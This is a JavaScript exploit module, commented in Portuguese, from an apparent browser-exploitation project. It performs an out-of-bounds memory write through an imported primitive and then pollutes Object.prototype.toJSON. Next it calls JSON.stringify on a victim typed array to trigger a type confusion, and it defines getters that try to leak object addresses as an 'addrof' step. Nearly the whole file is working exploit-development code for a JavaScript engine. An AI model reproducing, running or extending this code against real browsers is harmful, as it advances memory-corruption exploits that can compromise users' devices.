// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - ATUALIZADO)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Mesmo que HEISENBUG_CRITICAL_WRITE_OFFSET em core_exploit
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF, 0x7FFFFFFF];

let object_to_leak_A_v82 = null;
let object_to_leak_B_v82 = null;
let victim_typed_array_ref_v82 = null;
let probe_call_count_v82 = 0;
let marker_M1_ref_v82 = null;
let marker_M2_ref_v82 = null;
let details_of_M2_as_this_call_v82 = null; // Armazenará os detalhes da chamada onde M2 foi 'this' e confuso
const PROBE_CALL_LIMIT_V82 = 7;
const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282; // Usado para preencher o buffer da vítima

function toJSON_TA_Probe_AdvancedGetterLeak() {
    probe_call_count_v82++;
    const call_num = probe_call_count_v82;
    let current_call_log_info = {
        call_number: call_num,
        probe_variant: "TA_Probe_V82_AdvancedGetterLeak",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v82),
        this_is_M1: (this === marker_M1_ref_v82 && marker_M1_ref_v82 !== null),
        this_is_M2: (this === marker_M2_ref_v82 && marker_M2_ref_v82 !== null),
        m2_interaction_summary: null,
        error_in_probe: null
    };

    // Lógica ATUALIZADA para capturar details_of_M2_as_this_call_v82
    // Queremos os detalhes da primeira vez que 'this' é M2 e está confuso.
    if (current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
        if (!details_of_M2_as_this_call_v82) { // Captura apenas na primeira ocorrência da confusão em M2
            details_of_M2_as_this_call_v82 = { ...current_call_log_info }; // Copia o estado
            logS3(`[PROBE_V82] Call #${call_num}: CRITICAL M2 Type Confusion details CAPTURED: ${JSON.stringify(details_of_M2_as_this_call_v82)}`, "vuln");
        }
    }

    logS3(`[PROBE_V82] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V82) { return { recursion_stopped_v82: true, reason: "Probe call limit exceeded" }; }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            marker_M2_ref_v82 = { marker_id_v82: "M2_V82_Target", some_prop_M2: "M2_Initial_Value" };
            marker_M1_ref_v82 = { marker_id_v82: "M1_V82_Container", payload_M2: marker_M2_ref_v82 };
            logS3(`[PROBE_V82] Call #${call_num}: M1 and M2 markers created. Returning M1.`, "info");
            return marker_M1_ref_v82;
        } else if (current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
            logS3(`[PROBE_V82] Call #${call_num}: TYPE CONFUSION ON M2 ('this') DETECTED! ID: ${this.marker_id_v82}. Defining getter/property...`, "vuln");
            current_call_log_info.m2_interaction_summary = { getter_defined: false, direct_prop_set: false, getter_fired_during_stringify: false, leaked_value_from_getter: null };

            Object.defineProperty(this, 'leaky_A_getter_v82', {
                get: function() {
                    logS3(`[PROBE_V82] !!! Getter 'leaky_A_getter_v82' on confused M2 (this call #${call_num}) FIRED !!!`, "vuln");
                    current_call_log_info.m2_interaction_summary.getter_fired_during_stringify = true;

                    if (!victim_typed_array_ref_v82 || !victim_typed_array_ref_v82.buffer) {
                        logS3("[PROBE_V82] Getter: victim_typed_array_ref_v82 or its buffer is null!", "error");
                        current_call_log_info.m2_interaction_summary.leaked_value_from_getter = "getter_victim_null_err";
                        return "getter_victim_null_err";
                    }

                    let victim_float_view = new Float64Array(victim_typed_array_ref_v82.buffer);
                    let victim_u32_view = new Uint32Array(victim_typed_array_ref_v82.buffer);
                    const original_victim_val_idx0_low = victim_u32_view[0]; // Salvar valor original para restaurar (parte baixa)
                    const original_victim_val_idx1 = victim_u32_view[1]; // Salvar valor original para restaurar (parte alta)

                    // Tentativa de colocar o objeto no buffer para vazar seu endereço
                    victim_float_view[0] = object_to_leak_A_v82;
                    
                    let leaked_val_raw_float = victim_float_view[0]; // Ler como float
                    let leaked_low = victim_u32_view[0];
                    let leaked_high = victim_u32_view[1];
                    let leaked_int64_obj = new AdvancedInt64(leaked_low, leaked_high);
                    
                    logS3(`[PROBE_V82] Getter: VictimView[0] after objA assignment: Float=${leaked_val_raw_float}, HexLow=${toHex(leaked_low)}, HexHigh=${toHex(leaked_high)} (Int64: ${leaked_int64_obj.toString(true)})`, "leak");
                    current_call_log_info.m2_interaction_summary.leaked_value_from_getter = leaked_int64_obj.toString(true);
                    
                    // Restaurar valor original
                    victim_u32_view[0] = original_victim_val_idx0_low;
                    victim_u32_view[1] = original_victim_val_idx1;

                    // Verificar se o valor vazado parece um ponteiro (heurística)
                    // Condição de ponteiro: parte alta não é zero, nem toda FF (exceto ponteiros nulos ou especiais),
                    // e dentro de um intervalo esperado para ponteiros de heap/biblioteca.
                    // Esta heurística é muito específica e pode precisar de ajuste.
                    // Ex: High part entre 0x00000001 e 0x000F0000 (para alguns heaps) ou algo como 0xFFFF.... (para outros)
                    if (leaked_high !== 0 && leaked_high !== 0xFFFFFFFF && leaked_high < 0x80000000) { // Ajuste esta condição conforme necessário
                         // E leaked_low pode ter qualquer valor.
                        if ((leaked_high > 0x00000000 && leaked_high < 0x000F0000) || (leaked_high > 0x10000000 && leaked_high < 0x7FFFFFFF) ) {
                           logS3(`[PROBE_V82] Getter: Potential pointer leaked: ${leaked_int64_obj.toString(true)}`, "vuln");
                           return leaked_val_raw_float; // Retorna o float, mas o AdvancedInt64 é o que importa
                        }
                    }
                    return "getter_no_addr_v82"; // Não parece um ponteiro
                },
                enumerable: true, configurable: true
            });
            current_call_log_info.m2_interaction_summary.getter_defined = true;

            this.leaky_B_direct_v82 = object_to_leak_B_v82; // Tenta atribuir o objeto diretamente
            current_call_log_info.m2_interaction_summary.direct_prop_set = true;
            logS3(`[PROBE_V82] Call #${call_num}: Getter e propriedade direta definidos em M2. Retornando 'this' (M2).`, "info");
            
            // Atualiza details_of_M2_as_this_call_v82 com o sumário da interação se esta foi a chamada de confusão
            if (details_of_M2_as_this_call_v82 && details_of_M2_as_this_call_v82.call_number === call_num) {
                details_of_M2_as_this_call_v82.m2_interaction_summary = current_call_log_info.m2_interaction_summary;
            }
            return this; // Retorna o M2 modificado
        }
    } catch (e) {
        logS3(`[PROBE_V82] Call #${call_num}: ERROR in probe: ${e.message}${e.stack ? '\n' + e.stack : ''}`, "error");
        current_call_log_info.error_in_probe = e.message;
    } finally {
        // Garante que se details_of_M2_as_this_call_v82 foi definido nesta chamada, ele retenha o sumário de interação.
         if (details_of_M2_as_this_call_v82 && details_of_M2_as_this_call_v82.call_number === call_num) {
            if (current_call_log_info.m2_interaction_summary) {
                 details_of_M2_as_this_call_v82.m2_interaction_summary = current_call_log_info.m2_interaction_summary;
            }
            if (current_call_log_info.error_in_probe) {
                 details_of_M2_as_this_call_v82.error_in_probe = current_call_log_info.error_in_probe;
            }
        }
    }

    // Fallback return para chamadas que não se encaixam nos cenários acima
    return { generic_marker_v82: call_num, original_this_type: current_call_log_info.this_type };
}

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (AdvancedGetterLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null,
        toJSON_details: null, // Detalhes da sonda da melhor iteração (onde M2 foi confuso)
        stringifyResult: null, // Resultado do JSON.stringify da melhor iteração
        addrof_A_result: { success: false, msg: "Addrof A (Getter): Not triggered or failed.", value: null },
        addrof_B_result: { success: false, msg: "Addrof B (Direct): Not triggered or failed.", value: null },
        oob_value_used: null,
        heisenbug_on_M2_confirmed: false
    };
    let OOBEnvironmentCleaned = false;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        // Reset de estado para a iteração
        probe_call_count_v82 = 0;
        victim_typed_array_ref_v82 = null;
        marker_M1_ref_v82 = null;
        marker_M2_ref_v82 = null;
        details_of_M2_as_this_call_v82 = null; // Crucial resetar para cada iteração
        object_to_leak_A_v82 = { marker_A_v82: `LeakA_OOB_Val${toHex(current_oob_value)}` };
        object_to_leak_B_v82 = { marker_B_v82: `LeakB_OOB_Val${toHex(current_oob_value)}` };
        OOBEnvironmentCleaned = false;

        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;
        let iter_error = null;
        let iter_addrof_A = { success: false, msg: "Getter: Default", value: null };
        let iter_addrof_B = { success: false, msg: "Direct: Default", value: null };

        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done for iter Val${toHex(current_oob_value)}. Offset: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100); // Pausa após escrita OOB

            victim_typed_array_ref_v82 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
            // Preencher o buffer da vítima para identificar se o getter o acessa corretamente
            new Float64Array(victim_typed_array_ref_v82.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            logS3(`  Victim Uint8Array (size ${VICTIM_BUFFER_SIZE}) created and filled.`, "info", FNAME_CURRENT_ITERATION);

            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_AdvancedGetterLeak, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify...`, "info", FNAME_CURRENT_ITERATION);

                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_v82);
                logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${iter_raw_stringify_output}`, "info", FNAME_CURRENT_ITERATION);
                try {
                    iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output);
                } catch (e_parse) {
                    logS3(`  Failed to parse JSON.stringify output: ${e_parse.message}`, "error", FNAME_CURRENT_ITERATION);
                    iter_stringify_output_parsed = { error_parsing_json: iter_raw_stringify_output };
                }

                // Verificar se a TC em M2 ocorreu e se o getter/propriedade foi acessado
                let heisenbugConfirmedThisIter = false;
                if (details_of_M2_as_this_call_v82 && details_of_M2_as_this_call_v82.this_is_M2 && details_of_M2_as_this_call_v82.this_type === "[object Object]") {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  EXECUTE: Heisenbug (Type Confusion on M2) for OOB_Val ${toHex(current_oob_value)} CONFIRMED via details_of_M2_as_this_call_v82.`, "vuln", FNAME_CURRENT_ITERATION);
                    logS3(`  EXECUTE: Details of M2 interaction call: ${JSON.stringify(details_of_M2_as_this_call_v82)}`, "leak", FNAME_CURRENT_ITERATION);

                    // Analisar o resultado do getter a partir do que foi parseado do JSON.stringify
                    // A estrutura esperada é M1 -> payload_M2 -> (propriedades de M2)
                    let m2_payload_from_stringify = null;
                    if (iter_stringify_output_parsed?.marker_id_v82 === "M1_V82_Container" && iter_stringify_output_parsed.payload_M2) {
                        m2_payload_from_stringify = iter_stringify_output_parsed.payload_M2;
                    } else if (iter_stringify_output_parsed?.marker_id_v82 === "M2_V82_Target") { // Caso M2 seja o objeto raiz do stringify
                        m2_payload_from_stringify = iter_stringify_output_parsed;
                    }
                    
                    if (m2_payload_from_stringify?.marker_id_v82 === "M2_V82_Target") {
                        const val_getter_result = m2_payload_from_stringify.leaky_A_getter_v82;
                        iter_addrof_A.value = val_getter_result;
                        if (typeof val_getter_result === 'number' && val_getter_result !== FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD &&
                            details_of_M2_as_this_call_v82.m2_interaction_summary?.leaked_value_from_getter !== "getter_no_addr_v82" &&
                            details_of_M2_as_this_call_v82.m2_interaction_summary?.leaked_value_from_getter !== "getter_victim_null_err" ) {
                            // A lógica de "potential pointer" está dentro do getter e reflete em details_of_M2_as_this_call_v82
                            // Usamos o valor de AdvancedInt64 que o getter logou e armazenou em m2_interaction_summary.
                            const leaked_adv_int_str = details_of_M2_as_this_call_v82.m2_interaction_summary?.leaked_value_from_getter;
                            if (leaked_adv_int_str && leaked_adv_int_str !== "getter_no_addr_v82" && leaked_adv_int_str !== "getter_victim_null_err") {
                                iter_addrof_A.success = true;
                                iter_addrof_A.msg = `Possible pointer from getter: ${leaked_adv_int_str}`;
                                iter_addrof_A.value = leaked_adv_int_str; // Store the AdvancedInt64 string
                                logS3(`  ADDROF_A SUCCESS: ${iter_addrof_A.msg}`, "vuln", FNAME_CURRENT_ITERATION);
                            } else {
                                iter_addrof_A.msg = `Getter value from stringify: ${val_getter_result}, but not deemed pointer. Logged Int64: ${leaked_adv_int_str}`;
                            }
                        } else {
                             iter_addrof_A.msg = `Getter value not useful: ${JSON.stringify(val_getter_result)}. Logged Int64: ${details_of_M2_as_this_call_v82.m2_interaction_summary?.leaked_value_from_getter}`;
                        }

                        const val_direct_result = m2_payload_from_stringify.leaky_B_direct_v82;
                        iter_addrof_B.value = val_direct_result;
                        // Para leaky_B_direct_v82, esperamos que o próprio objeto_to_leak_B_v82 seja retornado se a atribuição funcionar
                        // e JSON.stringify o serializar corretamente.
                        if (val_direct_result && val_direct_result.marker_B_v82 === object_to_leak_B_v82.marker_B_v82) {
                            iter_addrof_B.success = true;
                            iter_addrof_B.msg = `object_to_leak_B_v82 identity confirmed from direct property.`;
                            logS3(`  ADDROF_B SUCCESS (Identity): ${iter_addrof_B.msg}`, "vuln", FNAME_CURRENT_ITERATION);
                        } else {
                            iter_addrof_B.msg = `Direct prop leaky_B_direct_v82 value: ${JSON.stringify(val_direct_result)}, not objB identity.`;
                        }
                    } else {
                         logS3(`  M2 payload not found as expected in stringify output. Output: ${JSON.stringify(iter_stringify_output_parsed)}`, "warn", FNAME_CURRENT_ITERATION);
                         iter_addrof_A.msg = "M2 payload not found in stringify output.";
                         iter_addrof_B.msg = "M2 payload not found in stringify output.";
                    }
                } else {
                    logS3(`  EXECUTE: Heisenbug (Type Confusion on M2) for OOB_Val ${toHex(current_oob_value)} NOT Confirmed via details_of_M2_as_this_call_v82. Probe details: ${JSON.stringify(details_of_M2_as_this_call_v82)}`, "error", FNAME_CURRENT_ITERATION);
                    iter_addrof_A.msg = "TC on M2 not confirmed.";
                    iter_addrof_B.msg = "TC on M2 not confirmed.";
                }

            } catch (e_str) {
                iter_error = e_str;
                logS3(`  ERROR during JSON.stringify or probe execution: ${e_str.message}${e_str.stack ? '\n' + e_str.stack : ''}`, "critical", FNAME_CURRENT_ITERATION);
            } finally {
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                    else delete Object.prototype[ppKey]; // Se não existia antes
                    logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_ITERATION);
                }
            }
        } catch (e_outer) {
            iter_error = e_outer;
            logS3(`  CRITICAL ERROR in outer try-catch for iteration ${toHex(current_oob_value)}: ${e_outer.message}${e_outer.stack ? '\n' + e_outer.stack : ''}`, "critical", FNAME_CURRENT_ITERATION);
        } finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
            OOBEnvironmentCleaned = true;
            logS3(`  OOB Environment cleared for iteration ${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
        }

        let current_iter_summary = {
            oob_value: toHex(current_oob_value),
            error: iter_error ? iter_error.message : null,
            toJSON_details_this_iter: details_of_M2_as_this_call_v82, // Detalhes da sonda (pode ser null se TC não ocorreu)
            stringify_output_this_iter: iter_stringify_output_parsed,
            addrof_A_this_iter: iter_addrof_A,
            addrof_B_this_iter: iter_addrof_B,
            heisenbug_on_M2_this_iter: !!(details_of_M2_as_this_call_v82 && details_of_M2_as_this_call_v82.this_is_M2 && details_of_M2_as_this_call_v82.this_type === "[object Object]")
        };
        iteration_results_summary.push(current_iter_summary);

        // ATUALIZAR best_result_for_runner: Priorizar a primeira iteração com addrof sucesso,
        // depois a primeira com TC sucesso, ou a última se nada funcionou.
        if (iter_addrof_A.success || iter_addrof_B.success) {
            if (!best_result_for_runner.addrof_A_result.success && !best_result_for_runner.addrof_B_result.success) { // Pega o primeiro sucesso de addrof
                best_result_for_runner.oob_value_used = toHex(current_oob_value);
                best_result_for_runner.toJSON_details = details_of_M2_as_this_call_v82;
                best_result_for_runner.stringifyResult = iter_stringify_output_parsed;
                best_result_for_runner.addrof_A_result = iter_addrof_A;
                best_result_for_runner.addrof_B_result = iter_addrof_B;
                best_result_for_runner.heisenbug_on_M2_confirmed = current_iter_summary.heisenbug_on_M2_this_iter;
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: AddrLeaked! Val${toHex(current_oob_value)}`;
            }
        } else if (current_iter_summary.heisenbug_on_M2_this_iter) {
            if (!best_result_for_runner.heisenbug_on_M2_confirmed) { // Pega a primeira TC confirmada se addrof falhou
                best_result_for_runner.oob_value_used = toHex(current_oob_value);
                best_result_for_runner.toJSON_details = details_of_M2_as_this_call_v82;
                best_result_for_runner.stringifyResult = iter_stringify_output_parsed;
                best_result_for_runner.addrof_A_result = iter_addrof_A; // Provavelmente falhou
                best_result_for_runner.addrof_B_result = iter_addrof_B; // Provavelmente falhou
                best_result_for_runner.heisenbug_on_M2_confirmed = true;
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: TC Confirmed Val${toHex(current_oob_value)}`;
            }
        }
        // Se nenhuma condição acima satisfeita, best_result_for_runner manterá os dados da última iteração
        // (ou o default se for a primeira iteração e nada funcionou)
        if (current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1] && !best_result_for_runner.oob_value_used) {
             best_result_for_runner.oob_value_used = toHex(current_oob_value);
             best_result_for_runner.toJSON_details = details_of_M2_as_this_call_v82;
             best_result_for_runner.stringifyResult = iter_stringify_output_parsed;
             best_result_for_runner.addrof_A_result = iter_addrof_A;
             best_result_for_runner.addrof_B_result = iter_addrof_B;
             best_result_for_runner.heisenbug_on_M2_confirmed = current_iter_summary.heisenbug_on_M2_this_iter;
        }
        
        if (iter_error) { // Se houve erro na iteração, registrar no resultado principal se ainda não há um melhor.
            if (!best_result_for_runner.errorOccurred && !best_result_for_runner.addrof_A_result.success && !best_result_for_runner.heisenbug_on_M2_confirmed) {
                 best_result_for_runner.errorOccurred = iter_error;
            }
        }
        await PAUSE_S3(200); // Pausa maior entre iterações
    } // Fim do loop de iterações

    if (!OOBEnvironmentCleaned && OOB_WRITE_VALUES_V82.length === 0) { // Caso não haja iterações
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Summary of all iterations: ${JSON.stringify(iteration_results_summary, null, 2)}`, "info", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result for runner: ${JSON.stringify(best_result_for_runner, null, 2)}`, "info", FNAME_CURRENT_TEST_BASE);
    
    return { // Retorna o objeto consolidado para o runner
        errorOccurred: best_result_for_runner.errorOccurred,
        toJSON_details: best_result_for_runner.toJSON_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_A_result: best_result_for_runner.addrof_A_result,
        addrof_B_result: best_result_for_runner.addrof_B_result,
        iteration_results_summary: iteration_results_summary, // Mantém o sumário de todas as iterações
        total_probe_calls_last_iter: probe_call_count_v82, // Probe calls da última iteração
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed
    };
}
